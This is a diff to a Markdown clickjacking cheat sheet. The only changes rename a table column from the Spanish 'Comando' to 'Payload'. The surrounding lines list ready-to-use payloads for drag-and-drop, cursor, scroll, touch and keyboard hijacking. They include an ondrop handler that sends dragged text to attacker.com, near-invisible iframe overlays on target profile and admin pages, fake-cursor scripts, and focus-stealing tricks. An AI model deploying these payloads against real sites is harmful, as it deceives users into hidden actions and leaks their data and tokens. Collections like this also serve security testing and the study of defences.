@@ -21,7 +21,7 @@ linked:
 
 ## Drag-and-Drop Clickjacking
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<div ondragover="event.preventDefault()" ondrop="fetch('//attacker.com/?d='+encodeURIComponent(event.dataTransfer.getData('text')))">Drop here</div>` | Drop event exfil dragged text data | Standard drag-exfil. |
 | `<iframe src="https://target.com/profile" style="position:absolute;opacity:0.0001;top:100px;left:100px;width:400px;height:200px"></iframe><div class="target" style="position:absolute;top:100px;left:100px;..." ondrop="captureDrop(event)">Drop here</div>` | Iframe overlay drop capture | Token theft drag. |
@@ -74,7 +74,7 @@ function captureDrop(e) {
 
 ## Cursor-Jacking
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<style>body{cursor:none}.fake{position:fixed;width:24px;height:24px;background:url('cursor.png');pointer-events:none;z-index:99999}</style><div class="fake" id="c"></div><script>onmousemove=e=>{c.style.left=(e.clientX+100)+'px';c.style.top=(e.clientY+100)+'px'}</script>` | Hide real cursor + show fake at offset | Standard cursor-jacking. |
 | `<style>iframe{cursor:none}</style>` + JS render fake cursor offset | Iframe cursor hide + fake offset | iframe-specific. |
@@ -126,7 +126,7 @@ document.addEventListener('mousemove', (e) => {
 
 ## Scroll-Jacking
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<iframe src="https://target.com/long-page#confirm-button" style="opacity:0.0001;..."></iframe>` | Anchor fragment auto-scroll to button | Anchor scroll. |
 | `<script>document.querySelector('iframe').contentWindow.scrollTo(0, 800)</script>` (same-origin only) | Force iframe scroll position | Same-origin scroll. |
@@ -146,7 +146,7 @@ document.addEventListener('mousemove', (e) => {
 
 ## Touch-Jacking (Mobile)
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<iframe src="https://target.com/admin/x" style="opacity:0.0001;..."></iframe><button ontouchstart="...">TAP TO CLAIM</button>` (mobile UA) | Mobile tap-jacking standard | Standard mobile. |
 | `<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">` | Disable pinch-zoom force layout | UX lock. |
@@ -166,7 +166,7 @@ document.addEventListener('mousemove', (e) => {
 
 ## Strokejacking (Keyboard)
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<input id="decoy" type="text" autofocus><iframe src="https://target.com/admin/x" style="opacity:0.0001;..."></iframe><script>document.querySelector('iframe').focus()</script>` | Steal focus to iframe input | Focus theft. |
 | `<input tabindex="1"><iframe tabindex="0" src="https://target.com/x"></iframe>` (tabindex 0 wins) | tabindex manipulation | Tab order. |
